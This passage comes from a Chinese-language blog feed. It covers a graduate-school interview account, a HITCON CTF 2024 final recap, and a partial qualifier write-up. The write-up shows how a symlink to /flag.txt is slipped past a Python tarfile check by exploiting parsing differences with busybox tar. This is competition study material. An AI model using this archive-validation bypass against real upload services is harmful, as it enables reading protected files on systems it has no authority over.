href=\"/doc/%E7%A0%94%E7%A9%B6%E6%89%80%E5%82%99%E5%AF%A9.pdf\"\u003e備審\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"/doc/%E7%A0%94%E7%A9%B6%E6%89%80%E7%B3%BB%E7%B5%B1%E7%B6%B2%E8%B7%AF%E5%8F%8A%E5%85%B6%E4%BB%96%E8%BB%9F%E7%A1%AC%E9%AB%94%E9%96%8B%E7%99%BC%E6%88%96%E7%AE%A1%E7%90%86%E5%AF%A6%E5%8B%99%E7%B6%93%E9%A9%97.pdf\"\u003ehomelab\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"/doc/%E7%A0%94%E7%A9%B6%E6%89%80%E6%9C%89%E5%88%A9%E8%B3%87%E6%96%99.pdf\"\u003e有利資料\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"推薦函\"\u003e推薦函\u003c/h2\u003e\n\u003cp\u003e雖說規定說要兩封，但是最多能五封，那肯定是寫好寫滿。\u003c/p\u003e\n\u003ch2 id=\"報考組別\"\u003e報考組別\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e資工丙組\u003c/li\u003e\n\u003cli\u003e資工丁組\u003c/li\u003e\n\u003cli\u003e資工戊組\u003c/li\u003e\n\u003cli\u003e資工數據所\u003c/li\u003e\n\u003cli\u003e資安甲組\u003c/li\u003e\n\u003cli\u003e資訊聯招\n\u003cul\u003e\n\u003cli\u003e網工\u003c/li\u003e\n\u003cli\u003e資工甲組\u003c/li\u003e\n\u003cli\u003e多媒體\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e智能系統研究所碩士班聯招\n\u003cul\u003e\n\u003cli\u003e乙組 主修資安與資訊工程\u003c/li\u003e\n\u003cli\u003e丙組 主修寬頻通訊與物聯網\u003c/li\u003e\n\u003cli\u003e丁組 主修人工智慧與資通訊網路\u003c/li\u003e\n\u003cli\u003e甲組 主修人工智慧、資料科學、運算與應用\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"性向測驗\"\u003e性向測驗\u003c/h2\u003e\n\u003cp\u003eBJ4，直接上共筆\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://hackmd.io/@VA9Kkd2XS6emLGuTGVde0A/rktkA9Xfkl\"\u003ehttps://hackmd.io/@VA9Kkd2XS6emLGuTGVde0A/rktkA9Xfkl\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://codimd.nckuctf.org/60FJeMdIScqigYw5O9qpxQ\"\u003ehttps://codimd.nckuctf.org/60FJeMdIScqigYw5O9qpxQ\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"面試\"\u003e面試\u003c/h2\u003e\n\u003cp\u003e公式基本上是：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e自我介紹 40 秒\u003c/li\u003e\n\u003cli\u003e教授或學長開始問問題\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e面試的時候其實我很緊張，怕有東西不小心回答錯或回答得不好然後就被追著打。或者是問我一些沒有把握的問題，因為我記性其實沒有很好，有點怕問一些比較背的問題比如說 RFC 號碼或者是一些比較深的專有名詞之類的，但看起沒沒有。\u003c/p\u003e\n\u003ch3 id=\"丁組\"\u003e丁組\u003c/h3\u003e\n\u003ch4 id=\"第一天\"\u003e第一天\u003c/h4\u003e\n\u003cp\u003e總共兩場，每場都是大約 10 個學長圍著你面試\u003c/p\u003e\n\u003cp\u003e基本上兩邊都問我 Net 的問題，可能看我\u003ca href=\"#%E6%80%A7%E5%90%91%E6%B8%AC%E9%A9%97\"\u003e性向測驗\u003c/a\u003e的 Net 寫好寫滿吧？\u003c/p\u003e\n\u003cp\u003e憑印象大概是：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e第一場\n\u003col\u003e\n\u003cli\u003e既然你有碰 ASN 的經驗，請問如何防止 BGP Hijacking\u003c/li\u003e\n\u003cli\u003e我寫的 SA/NA judge 相關問題\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e第二場\n\u003col\u003e\n\u003cli\u003e你是技能競賽資訊與網路技術的備取國手，你覺得你的弱項在哪，為何沒被選為國手\u003c/li\u003e\n\u003cli\u003e如果你比賽失利你會怎麼辦？\u003c/li\u003e\n\u003cli\u003e你有當組長或隊長的經驗嗎？\u003c/li\u003e\n\u003cli\u003e你怎麼發現成大沒檔 src IP\u003c/li\u003e\n\u003cli\u003e你覺得你適合丁組嗎？\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e感覺第一天過得不錯。\u003c/p\u003e\n\u003ch4 id=\"第二天\"\u003e第二天\u003c/h4\u003e\n\u003cp\u003e這天就主要是教授了然後跟丙組同一天，一場 7 分鐘，跟三個教授面試\u003c/p\u003e\n\u003cp\u003e基本上就講我 Home Lab 跟資安的東西，然後他們就問我沒有在學校計中幫忙過之類的嗎？\n我：主要是因為課業上比較繁雜加上想要有些時間打資安比賽，然後錢不夠多（後來想想我不該提錢不夠多這件事\u0026hellip;）\u003c/p\u003e\n\u003ch3 id=\"丙組\"\u003e丙組\u003c/h3\u003e\n\u003cp\u003e也是一場 7 分鐘，跟三個教授面試\u003c/p\u003e\n\u003cp\u003e自我介紹之後\u003c/p\u003e\n\u003cp\u003e中間的教授問我說：你有考過 CPE 嗎？\u003c/p\u003e\n\u003cp\u003e我說：有，高中考過四題\u003c/p\u003e\n\u003cp\u003e中間：高中可以考？\u003c/p\u003e\n\u003cp\u003e我：對，就付 500 塊，但之後就沒考過了\u003c/p\u003e\n\u003cp\u003e中間：那你熟演算法嗎？\u003c/p\u003e\n\u003cp\u003e我（危）：痾\u0026hellip;不熟\u003c/p\u003e\n\u003cp\u003e中間：那什麼是 NP Complete\u003c/p\u003e\n\u003cp\u003e我：痾\u0026hellip;\u0026hellip;不知道\u003c/p\u003e\n\u003cp\u003e中間：這不是很基本嗎？學校演算法有教吧！\u003c/p\u003e\n\u003cp\u003e我：痾\u0026hellip;\u0026hellip;抱歉這部分我不熟\u003c/p\u003e\n\u003cp\u003e之後換右邊，幾乎都問比賽跟 AIS3 所以比較順，然後左邊\u003c/p\u003e\n\u003cp\u003e左邊：你熟 kernel 嗎？\u003c/p\u003e\n\u003cp\u003e我：一點點但不太熟\u003c/p\u003e\n\u003cp\u003e左邊：我看你會的比較雜有沒有比較擅長的\u003c/p\u003e\n\u003cp\u003e我：我比較擅長網路\u003c/p\u003e\n\u003cp\u003e然後我就稍微講一下我的 home lab\u003c/p\u003e\n\u003cp\u003e左邊：那你有架過 NIC 嗎？\u003c/p\u003e\n\u003cp\u003e然後我整個很 confused 他在供三小，NIC 不是網卡嗎？\u003c/p\u003e\n\u003cp\u003e我：痾\u0026hellip;我不清楚\u003c/p\u003e\n\u003cp\u003e左邊：NIC 是網卡\u003c/p\u003e\n\u003cp\u003e我：喔~~~痾\u0026hellip;.不清楚\u003c/p\u003e\n\u003ch3 id=\"面試總結\"\u003e面試總結\u003c/h3\u003e\n\u003cp\u003e我覺得丁組第一天面的不錯，該答的都有答，但是第二天跟丙組就有點面的不太好，有點抖，所以一直覺得可能會直接下去。\u003c/p\u003e\n\u003ch2 id=\"放榜\"\u003e放榜\u003c/h2\u003e\n\u003cp\u003e結果放榜的時候成績其實沒我想的爛，丙組甚至是正取蠻驚訝的，得知正取以後當天跟所有幫我寫推薦函的教授或人道個喜並且感謝完以後馬上就去找教授，目前教授找完了，總之結果很讚，現在目標就是讓自己畢業了。\u003c/p\u003e\n\u003cp\u003e順便放個所有研究所的面試結果：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e丙組正取\u003c/li\u003e\n\u003cli\u003e丁組備 9\u003c/li\u003e\n\u003cli\u003e數據備 72\u003c/li\u003e\n\u003cli\u003e資安甲備 26\u003c/li\u003e\n\u003cli\u003e資訊聯招 下去\u003c/li\u003e\n\u003cli\u003e智能系統 正取\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/c3207efa-6d99-4a9f-939d-b0379104a29f\" alt=\"image\"\u003e\u003c/p\u003e\n","description":"","image":"","permalink":"https://blog.chummydns.com/blogs/nycu-interview/","title":"交大碩士推甄"},{"content":"\u003ch1 id=\"hitcon-ctf-2024-final-心得\"\u003eHITCON CTF 2024 Final 心得\u003c/h1\u003e\n\u003cp\u003e承接 \u003ca href=\"/blogs/hitconctf-2024-writeup\"\u003eQuals\u003c/a\u003e 來聊聊決賽吧！\u003c/p\u003e\n\u003ch2 id=\"前言\"\u003e前言\u003c/h2\u003e\n\u003cp\u003e這次參加 HITCON CTF Final 也算是我第一次參加這種比較大型的 CTF 決賽比賽，而我基本上負責規劃與設定整個隊伍的基礎建設，並提供機器給隊友架設並設定對內的自動化攻擊與防禦系統如 attack manager 或封包工具與攻擊重送工具。由於考慮到這場有提供 game box 且不會用到會場內網然後賽中我可能要顧 infra 加上 Ching 通靈到可能有 live CTF 所以我就在場外的飯店房間總部打比賽。\u003c/p\u003e\n\u003ch2 id=\"賽前準備\"\u003e賽前準備\u003c/h2\u003e\n\u003cp\u003e賽前一個月先把整個主要架構架好上好 ldap、file server、VPN 等等測試完寫好 document 然後交給 Caleb 架 attack manager 與 elk、Curious 架抓封包與重送工具，然後 Ching 架模擬環境給隊員學工具使用方式。\u003c/p\u003e\n\u003ch2 id=\"賽前一天\"\u003e賽前一天\u003c/h2\u003e\n\u003cp\u003e首先比賽前一天因為剛好去取貨撿到的二手 L3 switch 想說飯店如果有網路孔會很方便還能直接打 sitetosite 就扛了一台 7 公斤的東西過去，結果房間沒網路孔只有 wifi\u003c/p\u003e\n\u003cp\u003e晚上十點多規則放出來就要馬上工作當水管工把 tunnel 打通路由設通 MTU 調好然後測試，然後再應 Vincent55 與 kazma 需求把內網也串到社團內網上（外加幫隊友修網路（X）中途設到一半突然 jumpbox 斷線差點嚇死，結果看一下 DC 才發現是大家都斷掉，全部檢查完以後就等隔天。\u003c/p\u003e\n\u003ch2 id=\"第一天\"\u003e第一天\u003c/h2\u003e\n\u003cp\u003e比賽第一天剛開賽的時候發現連 scoreboard 會 403 但是 live 組連的上，因為我前一天沒有想到（或者規則沒看到） scoreboard 會鎖 ip，因為我只有設定 10.102.0.0/16，當時意識到在開賽一分鐘內光速把路由調好然後發公告要條 wireguard 的 allowips 以後基本上現場組跟飯店總部都能順利連線開始打了，然後接著幫竹區那邊 sync vpn 設定（他們似乎沒注意到公告）。\u003c/p\u003e\n\u003cp\u003e等整體穩定後 ShallowFeather 跟 Pwn2ooown 大佬們直接把第二題打穿了，但是 Pwn2ooown 對 attack manager 沒有很熟所以我接下幫他上 attack manager 的任務，而聽 Pwn2ooown 說似乎 scoreboard 跟題目更新 flag 好像會有 delay 所以我設定讓他一分鐘打一次，但是有發現 Caleb 給的 attack manager 腳本如果兩次拿到的 flag 是一樣的第二次會直接不送，因此花了點時間修他。\u003c/p\u003e\n\u003cp\u003e下午開始我接第五題的解題，首先因為這題他用 python 寫了一個 VM 殼，會先讀圖片然後用圖片生成 op code 而且是中文的 op code 長的雞巴噁心，花了一些時間看懂他的 op code後接下寫 decompiler 的任務，然後就寫到晚上了，所以這題基本上第一天我們只有做黑箱，晚上把 decompiler 優化到可以除了變數名稱完美生成 python code，讓第二天可以方便白箱。\u003c/p\u003e\n\u003ch2 id=\"第二天\"\u003e第二天\u003c/h2\u003e\n\u003cp\u003e第二天考慮到可能會需要 patch 所以把白箱的工作交給 Ching 然後叫 Vincent55 寫 opcode 轉圖片然後我寫 compiler ，到中午的時候 compiler 基本上完成了，但是 Vincent55 的 opcode 轉圖片還沒寫完就跑掉了，所以我開始看 opcode 轉圖片的部分，後面越看約頭痛，考慮到時間不多了因此忍痛放棄開始看別隊的 patch 看看能否打下那幾個第五題還活著的隊伍順便找個好 patch 偷，結果打到最後才意識到既然一張圖片代表一個 function，484 可以把每一隊的 patch 收集起來然後把 patch 好且沒有藏後門的 function 挑出來組合成新 patch 丟上去，於是最後五輪就這樣做，把 MMM 隊的 patch 拿下來然後拆掉後門丟上去還成功通過 SLA。\u003c/p\u003e\n\u003ch2 id=\"總結\"\u003e總結\u003c/h2\u003e\n\u003cp\u003eInfra 整體上除了開賽 scoreboard 的問題還有教一些狀況外連有 file server 然後能登入 LDAP 以及比賽當天還在用模擬用 vpn config 的隊員，以及開賽時 Curious 寫的封包與重送工具直接炸開開始救火以外基本上還算穩定。\u003c/p\u003e\n\u003cp\u003e但感覺還有很多需要改進的地方，因為其實有很多原本規劃要架但時間關係沒架的東西比如 CI/CD 與 monitor，然後感覺我投資在 compiler 的時間太久了。\u003c/p\u003e\n\u003cp\u003e然後這幾天官方的 infra 似乎也在燒所以也有出現不知道到底是我的問題、官方的問題、還是隊友自己的問題的情況，比如淺宇就跟我抱怨他有一題要送大圖片但送到一半直接 EOF，但是我從 jumpbox 錄封包就看到是圖片送到一半賽場題目那邊直接送 TCP FIN 的問題。\u003c/p\u003e\n\u003cp\u003e雖說只拿到世界第十名，但是至少台灣第一沒被隔壁四人組拿走。\u003c/p\u003e\n\u003cp\u003e附個第五題 \u003ca href=\"https://github.com/Jimmy01240397/CTF-writeup/blob/master/hitconctf-2024-final-writeup/ad-fulu/decompiler/allresult.py\"\u003edecompile 結果\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/a7ec9f7e-9655-4282-a83c-9418222ded8a\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/bb0aa319-80e7-48c2-ac14-dadec317326e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/93510995-0cf6-468e-a1cc-55123dae7c9b\" alt=\"image\"\u003e\u003c/p\u003e\n","description":"","image":"/images/CTF.png","permalink":"https://blog.chummydns.com/blogs/hitconctf-2024-final/","title":"HITCON CTF 2024 Final 心得"},{"content":"\u003ch1 id=\"hitconctf-2024-writeup\"\u003ehitconctf-2024-writeup\u003c/h1\u003e\n\u003cp\u003e這場與 \u003ccode\u003e星爆吉娃娃\u003c/code\u003e、\u003ccode\u003eBambooFox\u003c/code\u003e、以及我們 \u003ccode\u003eB33f 50UP\u003c/code\u003e 所組成的 \u003ccode\u003e星爆牛炒竹狐\u003c/code\u003e 隊伍一起打到了世界第 24 名、台灣排名第一名，並且打進今年 HITCON CTF 決賽。\u003c/p\u003e\n\u003cp\u003e這邊就來寫一下我解的題目 writeup。\u003c/p\u003e\n\u003ch2 id=\"戰績\"\u003e戰績\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/1f60d911-041b-4419-9eb3-b1cfe0e46feb\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/4278d28e-9f26-4ef1-9ebb-443a0a18adce\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/fb014145-7e99-4cb2-8f6d-b3e50ee87d4d\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/f33a0522-3ffc-4306-a5f3-b9f7a180bb7b\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch2 id=\"flag-reader\"\u003eFlag Reader\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/a3a33711-1427-4d0b-ab7b-c1c11c218d55\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e目標是上傳一個帶有 flag.txt -\u0026gt; /flag.txt 的 symlink，但是 server 的 python 會用 tarfile 做一次 tarinfo 的檢查，檢查一定要是 file 且名字不能帶 flag.txt，檢查過才會用 subprocess 跑 busybox tar 去解檔。\u003c/p\u003e\n\u003cp\u003e首先我先去看\u003ca href=\"https://github.com/python/cpython/blob/b455a5a55cb1fd5bb6178a969e8ebd0e6e91b610/Lib/tarfile.py#L122\"\u003etarfile 定義為 isfile 的檔案類型\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eREGULAR_TYPES \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e (REGTYPE, AREGTYPE,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                 CONTTYPE, GNUTYPE_SPARSE)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e發現 typebyte 要設成 \u003ccode\u003e\\0\u003c/code\u003e、\u003ccode\u003e0\u003c/code\u003e、\u003ccode\u003e7\u003c/code\u003e、\u003ccode\u003eS\u003c/code\u003e isfile 結果才會是 true。\u003c/p\u003e\n\u003cp\u003e最一開始我注意到 \u003ccode\u003eS\u003c/code\u003e 這個東西，發現是 \u003ca href=\"https://www.gnu.org/software/tar/manual/html_section/Sparse-Formats.html\"\u003eGNU 特有的 type\u003c/a\u003e 但是不知道為何我用自己 linux 測以後，發現 \u003ccode\u003etarfile\u003c/code\u003e 會認 Sparse file 但是 \u003ccode\u003etar\u003c/code\u003e 不知道為何還是按照一般的檔案去解，這邊可能有待研究。\u003c/p\u003e\n\u003cp\u003e反正我先建了一個 tar 包了兩個檔案，一個是一個動過手腳的空 Sparse file 一個就 flag 的 symlink，這邊的製作方式是。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etouch \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eln -s /flag.txt flag.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etar cvf \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e flag.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e接著用 Hex editer 改，把 header offset 482 的 isextended 設成 true （非 \\0）這樣他就會多讀一個 Block 作為 Sparse 的 extend header，那那個 Block 原本是放 flag.txt 的 header 就會被蓋掉，這樣 \u003ccode\u003etarfile\u003c/code\u003e 就只會認出個檔案而已，但是因為上面講的 tar 沒認 Sparse file 所以她解開就會把兩個檔案都解開，應該就能繞過檢查。\u003c/p\u003e\n\u003cp\u003e但是發現失敗了，自己架一次以後發現原因出在 \u003ca href=\"https://github.com/brgl/busybox/blob/abbf17abccbf832365d9acf1c280369ba7d5f8b2/archival/libarchive/get_header_tar.c#L432\"\u003ebusybox tar 的這個位置\u003c/a\u003e可以發現他沒有實作 Sparse file，然後遇到沒有實作的 type 就會直接 Crash。\u003c/p\u003e\n\u003cp\u003e因此我開始找別的突破點，後來發現。\u003c/p\u003e\n\u003cp\u003e我們可以去比對 python tarfile 跟 busybox tar 的 source code 裡面讀取數字的地方。\n\u003ca href=\"https://github.com/python/cpython/blob/3.12/Lib/tarfile.py#L175\"\u003etarfile\u003c/a\u003e\n\u003ca href=\"https://git.busybox.net/busybox/tree/archival/libarchive/get_header_tar.c?h=1_36_stable#n21\"\u003ebusybox tar\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e可以發現兩邊的行為有很多不一致，其中有一個地方是 busybox tar 那邊取數字的取法是把該 field 範圍的字串用 \u003ccode\u003estrtoull\u003c/code\u003e 以 base 8 轉成 \u003ccode\u003eunsigned long long\u003c/code\u003e，而 \u003ccode\u003estrtoull\u003c/code\u003e 會從 low byte 開始讀數字，讀到第一個非數字為止，而接下來會做判斷。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ev \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estrtoull\u003c/span\u003e(str, \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003eend, \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e/* std: \u0026#34;Each numeric field is terminated by one or more\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e * \u0026lt;space\u0026gt; or NUL characters\u0026#34;. We must support \u0026#39; \u0026#39;! */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003eend \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\0\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003eend \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以看到他會檢查非數字如果是 \u0026lsquo;\\0\u0026rsquo; 或 \u0026rsquo; \u0026rsquo; 就不會走進 if，而裡面是處理大數字時改為用 base 256 計算的方式。也就是說如果我們把數字的 field 改成 \u003ccode\u003e0 1111111\u003c/code\u003e 這類的，他會得到 \u003ccode\u003e0\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e接著看一下 \u003ccode\u003etarfile\u003c/code\u003e 的 \u003ccode\u003enti\u003c/code\u003e。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ents\u003c/span\u003e(s, encoding, errors):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u0026#34;Convert a null-terminated bytes object to a string.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    \u0026#34;\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    p \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efind(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\0\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e p \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        s \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e s[:p]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode(encoding, errors)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003enti\u003c/span\u003e(s):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# .....................\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            s \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e nts(s, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ascii\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;strict\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            n \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int(s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estrip() \u003cspan style=\"color:#f92672\"\u003eor\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eValueError\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eraise\u003c/span\u003e InvalidHeaderError(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;invalid header\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# .....................\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以看到他會先找到第一個 \u0026lsquo;\\0\u0026rsquo; 以後將前面的 byte 做 decode 以後用 int 以 base 8 轉成整數，那如果按照上面用 \u003ccode\u003e0 1111111\u003c/code\u003e 會發生甚麼事情。\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e\u0026gt;\u0026gt;\u0026gt; int(\u0026#39;0 11111\u0026#39;, 8)\nTraceback (most recent call last):\n  File \u0026#34;\u0026lt;stdin\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt;\nValueError: invalid literal for int() with base 8: \u0026#39;0 11111\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可以發現他會直接 \u003ccode\u003eValueError\u003c/code\u003e 而 \u003ccode\u003eValueError\u003c/code\u003e 會 raise \u003ccode\u003eInvalidHeaderError\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e接著去看 \u003ccode\u003eTarFile.next\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etarinfo \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        tarinfo \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e self\u003cspan 